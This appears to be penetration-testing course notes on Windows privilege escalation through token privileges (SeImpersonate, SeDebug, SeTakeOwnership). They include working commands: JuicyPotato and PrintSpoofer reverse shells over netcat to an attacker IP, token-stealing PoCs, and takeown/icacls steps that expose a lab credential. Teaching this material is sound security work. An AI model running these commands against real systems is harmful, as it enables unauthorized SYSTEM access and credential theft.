# Overview

Privileges are rights granted to an account to perform local system operations (managing services, loading drivers, debugging, etc.), distinct from access rights which control access to securable objects. They're stored in a database and delivered via access token at logon, and can differ across systems in an AD domain. When a privileged action is attempted, Windows checks the token for the required privilege and whether it's enabled — most are disabled by default, some enableable via an elevated console.

From an assessment perspective, a user with specific privileges may allow direct privilege escalation or further access toward the ultimate goal of administrative control.

## Windows Authorization Process

Security principals — anything that can be authenticated by the Windows operating system: user/computer accounts, processes, and security groups — are the primary means of controlling resource access on Windows, each identified by a unique, permanent `SID`.

<img width="908" height="651" alt="image" src="https://github.com/user-attachments/assets/2237d4fc-4c2f-44fd-a341-9031f770c38b" />

The image above show when accessing a securable object, the user's access token (containing their SID, group SIDs, and privileges) is compared against the object's `Access Control Entries` (ACEs). Access is then granted or denied based on this comparison. During assessments, we aim to abuse this process — leveraging or inserting ourselves into it to escalate privileges and advance toward our goal.

## Rights and Privileges in Windows

Many built-in Windows groups grant powerful rights abusable for privilege escalation, potentially leading to Domain Admin, local admin, or SYSTEM access. Some of these groups are listed below:

| Group | Key Abuse Potential |
|---|---|
| Default Administrators | Domain Admins & Enterprise Admins are "super" groups |
| Server Operators | Modify services, access SMB shares, backup files |
| Backup Operators | Can log on to DCs locally, shadow copy SAM/NTDS, read registry remotely — effectively Domain Admins |
| Print Operators | Can log on to DCs locally and load malicious drivers |
| Hyper-V Administrators | Full control over virtual DCs — treat as Domain Admins |
| Account Operators | Can modify non-protected domain accounts and groups |
| Remote Desktop Users | Often granted RDP login rights; useful for lateral movement |
| Remote Management Users | Can PSRemote onto DCs |
| Group Policy Creator Owners | Can create GPOs; dangerous if also granted link permissions |
| Schema Admins | Can modify AD schema and backdoor future Groups/GPOs |
| DNS Admins | Can load a malicious DLL on a DC or create a WPAD record for reliable exploitation |

## User Rights Assignment

User rights are localhost settings controlling what actions accounts can perform. Key rights to be aware of from a privilege escalation standpoint:

| Setting Constant | Setting Name | Standard Assignment | Description |
|---|---|---|---|
| SeNetworkLogonRight | Access this computer from the network | Administrators, Authenticated Users | Determines which users can connect to the device from the network. Required by SMB, NetBIOS, CIFS, and COM+. |
| SeRemoteInteractiveLogonRight | Allow log on through Remote Desktop Services | Administrators, Remote Desktop Users | Determines which users/groups can access the login screen of a remote device through RDS. |
| SeBackupPrivilege | Back up files and directories | Administrators | Allows bypassing file, directory, registry, and other persistent object permissions for backup purposes. |
| SeSecurityPrivilege | Manage auditing and security log | Administrators | Allows specifying object access audit options and viewing/clearing the Security log in Event Viewer. |
| SeTakeOwnershipPrivilege | Take ownership of files or other objects | Administrators | Allows taking ownership of any securable object including AD objects, NTFS files, printers, registry keys, services, and threads. |
| SeDebugPrivilege | Debug programs | Administrators | Allows attaching to or opening any process, even those not owned by the user. Provides access to sensitive OS components. |
| SeImpersonatePrivilege | Impersonate a client after authentication | Administrators, Local Service, Network Service, Service | Allows programs to impersonate a user or another specified account and act on their behalf. |
| SeLoadDriverPrivilege | Load and unload device drivers | Administrators | Allows dynamically loading and unloading device drivers, which run as highly privileged code. |
| SeRestorePrivilege | Restore files and directories | Administrators | Allows bypassing file, directory, registry, and other persistent object permissions when restoring backups. Can set object ownership. |
| SeTcbPrivilege | Act as part of the operating system | Administrators, Local Service, Network Service, Service | Allows a process to assume the identity of any user and access their permitted resources. Typically assigned to AV or backup service accounts. |


Typing the command `whoami /priv` will give you a listing of all user rights assigned to your current user. Some rights are only available to administrative users and can only be listed/leveraged when running an elevated cmd or PowerShell session. These concepts of elevated rights and `User Account Control (UAC)` are security features introduced with Windows Vista to default to restricting applications from running with full permissions unless necessary. If we compare and contrast the rights available to us as an admin in a non-elevated console vs. an elevated console, we will see that they differ drastically.

# SeImpersonate and SeAssignPrimaryToken

Every Windows process has a token describing its running account. Tokens aren't secured resources — they're memory locations potentially brute-forceable — and `SeImpersonate` is required to use them. It's admin-only and often removed during hardening.

Legitimate programs use token impersonation to escalate from Administrator to SYSTEM (e.g., calling WinLogon for a SYSTEM token). Attackers abuse this via "Potato-style" privescs, where a service account with `SeImpersonate` tricks a SYSTEM process into connecting to it, handing over its token.

This privilege commonly appears after gaining RCE through service account contexts (web shells, Jenkins, MSSQL, etc.). Its presence should be checked immediately as it typically offers a quick path to SYSTEM.

---

## SeImpersonate Example - JuicyPotato

In this scenario, we gain RCE on a SQL server via `xp_cmdshell` as the `mssql$sqlexpress01` service account. Checking privileges confirms `SeImpersonatePrivilege` is enabled.

We then upload `JuicyPotato.exe` and `nc.exe` to the target, set up a Netcat listener, and execute:

```
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

JuicyPotato abuses `SeImpersonate`/`SeAssignPrimaryToken` via DCOM/NTLM reflection, attempting both `CreateProcessWithTokenW` and `CreateProcessAsUser`. This yields a SYSTEM shell on the listener.

---

### PrintSpoofer and RoguePotato

JuicyPotato doesn't work on Windows Server 2019 or Windows 10 build 1809+. PrintSpoofer and RoguePotato fill this gap, abusing the same privileges to achieve SYSTEM access.

Using PrintSpoofer via `xp_cmdshell` to catch a reverse shell:

```
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

This confirms `SeImpersonatePrivilege`, opens a named pipe, and calls `CreateProcessAsUser()`, delivering a SYSTEM shell to the waiting Netcat listener.

Familiarity with all these tools is essential, as the right one depends on the target's OS version and patch level.

# SeDebugPrivilege

`SeDebugPrivilege` is sometimes assigned to developers for troubleshooting instead of granting full admin access. It's configurable via local/domain Group Policy and by default only administrators hold it — as it allows reading sensitive memory and modifying kernel/application structures.

During internal pentests, this privilege is worth targeting. Developers are likely candidates to have it assigned, making them high-value targets when cracking NTLMv2 hashes (e.g., captured via Responder). Crucially, this privilege won't show up in remote enumeration tools like BloodHound, so it's worth checking manually when you have credentials and RDP access but no obvious privilege path.

After logging on as a user assigned the `Debug programs` right and opening an elevated shell, we see `SeDebugPrivilege` is listed.

```
C:\htb> whoami /priv

----------------------
```

## Remote Code Execution as SYSTEM

We can also leverage `SeDebugPrivilege` for `RCE`. Using this technique, we can elevate our privileges to SYSTEM by launching a `child process` and using the elevated rights granted to our account via `SeDebugPrivilege` to alter normal system behavior to inherit the token of a parent process and impersonate it. If we target a `parent process` running as SYSTEM (specifying the Process ID (or PID) of the target process or running program), then we can elevate our rights quickly. Let's see this in action.

First, transfer this `PoC` [script](https://github.com/decoder-it/psgetsystem) over to the target system. Next we just load the script and run it with the following syntax:

`[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`. 

Note that we must add a third blank argument `""` at the end for the PoC to work properly.

Open an elevated PowerShell console (right-click, run as admin, and type in the credentials for the `jordan` user). Next, type `tasklist` to get a listing of running processes and accompanying PIDs.

```
PS C:\htb> tasklist 

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   612 Console                    1     10,408 K
```

Here we can target `winlogon.exe` running under PID 612, which we know runs as SYSTEM on Windows hosts.

<img width="986" height="507" alt="image" src="https://github.com/user-attachments/assets/b511a6c8-743c-4bd7-b791-8abe467b759d" />

We could also use the `Get-Process` cmdlet to grab the PID of a well-known process that runs as SYSTEM (such as LSASS) and pass the PID directly to the script, cutting down on the number of steps required.

<img width="1016" height="353" alt="image" src="https://github.com/user-attachments/assets/4c2b6729-0414-49c3-8d6b-bca7464e9b09" />

Other tools such as [this](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) one exist to pop a SYSTEM shell when we have `SeDebugPrivilege`. 

**Often we will not have RDP access to a host, so we'll have to modify our PoCs to either return a reverse shell to our attack host as SYSTEM or another command, such as adding an admin user. Play around with these PoCs and see what other ways you can achieve SYSTEM access, especially if you do not have a fully interactive session, such as when you achieve command injection or have a web shell or reverse shell connection as the user with SeDebugPrivilege**.

# SeTakeOwnershipPrivilege

This privilege grants `WRITE_OWNER` rights over any securable object (AD objects, NTFS files/folders, printers, registry keys, services, processes), allowing the user to change an object's owner. Administrators hold it by default, but it may also appear on service accounts (e.g., backup/VSS accounts) alongside `SeBackupPrivilege`, `SeRestorePrivilege`, and `SeSecurityPrivilege` as a way to grant granular access without full local admin rights.

While an edge case, it's worth understanding — particularly in AD environments where assigning this right to a controlled user can enable reading sensitive files on file shares, or when other privilege escalation methods are blocked.

<img width="758" height="514" alt="image" src="https://github.com/user-attachments/assets/ee7af822-a119-420a-9ceb-624a47a0417a" />

The setting can be set in Group Policy under:

- `Computer Configuration` ⇾ `Windows Settings` ⇾ `Security Settings` ⇾ `Local Policies` ⇾ `User Rights Assignment`

<img width="1165" height="610" alt="image" src="https://github.com/user-attachments/assets/f8416347-90e5-4b03-aad0-301b66c64e1e" />

With this privilege, a user could take ownership of any file or object and make changes that could involve access to sensitive data, `Remote Code Execution (RCE)` or `Denial-of-Service (DOS)`.

Suppose we encounter a user with this privilege or assign it to them through an attack such as GPO abuse using `SharpGPOAbuse`. In that case, we could use this privilege to potentially take control of a shared folder or sensitive files such as a document containing passwords or an SSH key.

## Leveraging the Privilege

1. Reviewing Current User Privileges

```
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled
```

2. Enabling SeTakeOwnershipPrivilege

Notice from the output that the privilege is not enabled. We can enable it using this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) which is detailed in this [blog](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) post, as well as [this](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) one which builds on the initial concept.

```
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

3. Choosing a Target File

File shares are a rich source of information, often misconfigured even when structured with `Public`/`Private` directories. In this scenario, we can browse both but find most `Private` files return `Access denied` — until we spot `cred.txt` in the `Private\IT` subdirectory.

With `SeTakeOwnershipPrivilege` (granted directly or via a misconfigured GPO), we can take ownership of and read any file, making `cred.txt` an ideal target.

> **Note:** Take great care when performing a potentially destructive action like changing file ownership, as it could cause an application to stop working or disrupt user(s) of the target object. Changing the ownership of an important file, such as a live web.config file, is not something we would do without consent from our client first. Furthermore, changing ownership of a file buried down several subdirectories (while changing each subdirectory permission on the way down) may be difficult to revert and should be avoided.

Let's check out our target file to gather a bit more information about it.

```
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
 
FullName                                 LastWriteTime         Attributes Owner
--------                                 -------------         ---------- -----
C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive
```

4. Checking File Ownership

We can see that the owner is not shown, meaning that we likely do not have enough permissions over the object to view those details. We can back up a bit and check out the owner of the IT directory.

```
PS C:\htb> cmd /c dir /q 'C:\Department Shares\Private\IT'

 Volume in drive C has no label.
 Volume Serial Number is 0C92-675B
 
 Directory of C:\Department Shares\Private\IT
 
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  .
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  ..
06/18/2021  12:23 PM                36 ...                    cred.txt
               1 File(s)             36 bytes
               2 Dir(s)  17,079,754,752 bytes free
```

We can see that the IT share appears to be owned by a service account and does contain a file `cred.txt` with some data inside it.

5. Taking Ownership of the File

Now we can use the `takeown` Windows binary to change ownership of the file.

```
PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'
 
SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
```

6. Confirming Ownership Changed

We can confirm ownership using the same command as before. We now see that our user account is the file owner.

```
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
 
Name     Directory                       Owner
----     ---------                       -----
cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student
```

7. Modifying the File ACL

We may still not be able to read the file and need to modify the file ACL using `icacls` to be able to read it.

```
PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'

cat : Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied.
At line:1 char:1
+ cat 'C:\Department Shares\Private\IT\cred.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Department Shares\Private\IT\cred.txt:String) [Get-Content], Unaut
   horizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

Let's grant our user full privileges over the target file.

```
PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

processed file: C:\Department Shares\Private\IT\cred.txt
Successfully processed 1 files; Failed processing 0 files
```

8. Reading the File

If all went to plan, we can now read the target file from the command line, open it if we have RDP access, or copy it down to our attack system for additional processing (such as cracking the password for a KeePass database.

```
PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'

NIX01 admin
 
root:n1X_p0wer_us3er!
```

> **Note:** After performing these changes, we would want to make every effort to revert the permissions/file ownership. If we cannot for some reason, we should alert our client and carefully document the modifications in an appendix of our report deliverable. Again, leveraging this permission can be considered a destructive action and should be done with great care. Some clients may prefer that we document the ability to perform the action as evidence of a misconfiguration but not fully take advantage of the flaw due to the potential impact.
